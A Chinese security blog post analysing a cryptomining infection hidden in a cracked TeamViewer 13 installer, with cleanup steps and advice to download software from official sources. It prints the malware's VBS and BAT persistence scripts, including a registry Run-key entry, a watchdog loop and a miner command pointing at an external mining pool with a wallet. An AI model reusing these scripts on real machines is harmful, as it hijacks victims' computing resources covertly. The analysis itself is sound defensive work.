***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

 **0x0 故事背景**

**最近有个远程管理一下某内网服（tiao）务（ban）器（ji）的需求，映射到公网又不安全毕竟黑帽子这么多，思来想去之后还是觉得老老实实装个Teamviewer最靠谱，度娘一下发现还真的不少破解版资源可以下载，于是随意下载一个破解版准备开始操作。**

 **0x1 安装过程**

先看一下文件描述信息也没有发现什么问题，就开始下一步安装了。

![你下载的TeamViewer13破解版可能有毒](https://image.3001.net/images/20180804/1533353369_5b651d99ed14d.png!small)安装完成了功能正常，一切OK，渐渐的电脑开始卡到爆，敏感的白帽子有一种不好的预感。

![你下载的TeamViewer13破解版可能有毒](https://image.3001.net/images/20180804/1533353377_5b651da130c4a.png!small)
**0x2 问题排查**

开始仔细的检查一下进程列表在最后发现了一个奇怪的进程，居然被植入了挖矿病毒这个也太明显了吧，也不搞点进程注入无文件攻击之类的高端技术，系统盘下面也多了不少.bat与.vbs文件。![你下载的TeamViewer13破解版可能有毒](https://image.3001.net/images/20180804/1533353405_5b651dbd3692a.png!small)直接结束了挖矿的进程之后又自动起来了，还是看看这些同伴里面到底写了什么玩意。
![你下载的TeamViewer13破解版可能有毒](https://image.3001.net/images/20180804/1533353413_5b651dc5b5dc8.png!small)

    
    
    0.Servicecrsssr.vbs：
     im WShellSet WShell = CreateObject("WScript.Shell")WShell.Run "%windir%\winvprse.bat", 0Set WShell = Nothing

1.Winprs.bat：

    
    
    @Echo OffREG ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\run /v "Chrome" /f /t REG_SZ /d "%windir%\servicecrsssr.vbs"Exit
      
    

2.Winvpr.vbs：

    
    
    im WShellSet WShell = CreateObject("WScript.Shell")WShell.Run "winprs.bat", 0Set WShell = Nothing  
    

3.Winvprse.bat：

    
    
     @echo offSETLOCAL EnableExtensions:starttimeout /t 160 /nobreak > NULecho offtasklist /FI "IMAGENAME eq wmipvrse.exe" 2>NUL | find /I /N "wmipvrse.exe" >NULif "%ERRORLEVEL%"=="0" goto starttasklist /FI "IMAGENAME eq wmipvrse.exe" 2>NUL | find /I /N "wmipvrse.exe" >NULif "%ERRORLEVEL%"=="1" goto processnotrunning:processnotrunningstart "" "%windir%\xdgaudio.vbs"goto startexit  
    

4.xdgaudio.vbs

    
    
    Dim WShell
    
    Set WShell = CreateObject("WScript.Shell")WShell.Run "wmipvrse.exe --cpu-priority 2 --cpu-affinity 2 -a cryptonight -o stratum+tcp://krb.crypto-coins.club:5555 -u KjCJtxsXLAd4hUBXAUKxPSPn3L2YaAgihUUc8SQAaCfeG1QpN3kNyLyBRjRUdzmaAdYhMyoZJvUMceBuWcR3a9rnA3U4EBJ -p x", 0
    
    Set WShell = Nothing  
    

5.Wmipvrse.exe

矿池与钱包都这么出来了，看看到底挖了多少钱。

##
![你下载的TeamViewer13破解版可能有毒](https://image.3001.net/images/20180804/1533353436_5b651ddc03445.png!small)

##
![你下载的TeamViewer13破解版可能有毒](https://image.3001.net/images/20180804/1533353447_5b651de74ec9c.png!small)

![你下载的TeamViewer13破解版可能有毒](https://image.3001.net/images/20180804/1533353436_5b651ddc03445.png!small)
**0x3 逆向分析**

对Wmipvrse.exe这个进程里面的东西还是感到好奇，决定还是看一看，已经加壳了不过还好是UPX的标准壳可直接脱。

CPU-miner
github上面的开源代码![你下载的TeamViewer13破解版可能有毒](https://image.3001.net/images/20180804/1533353455_5b651def742bd.png!small)![你下载的TeamViewer13破解版可能有毒](https://image.3001.net/images/20180804/1533353460_5b651df423e7d.png!small)![你下载的TeamViewer13破解版可能有毒](https://image.3001.net/images/20180804/1533353463_5b651df7c4436.png!small)
**  
0x4 病毒清理**

 ****事到如此根据几个vbs与bat文件的内容，运行原理还是比较清楚了，就动手清理了。

### Step1：使用PCHunter删除6个病毒母体

    
    
    servicecrsssr.vbs
    
    Winprs.bat 
    
    Winvpr.vbs 
    
    Winvprse.bat
    
    Wmipvrse.exe
    
     xdgaudio.vbs

### Step2：清除注册表

![你下载的TeamViewer13破解版可能有毒](https://image.3001.net/images/20180804/1533353686_5b651ed6aa7bb.png!small)

 **0x5 总结** ****

> 1.下载软件尽量选择官方平台或者可信的第三方软件平台。
>
> 2.天下没有白吃的午餐，破解版软件里面可能含有一些让你惊喜的病毒木马后门，也许是一个大礼包呢。
>
> 3.安全无小事，日常需注意。

 ***本文作者：si1ence，转载请注明来自FreeBuf.COM**

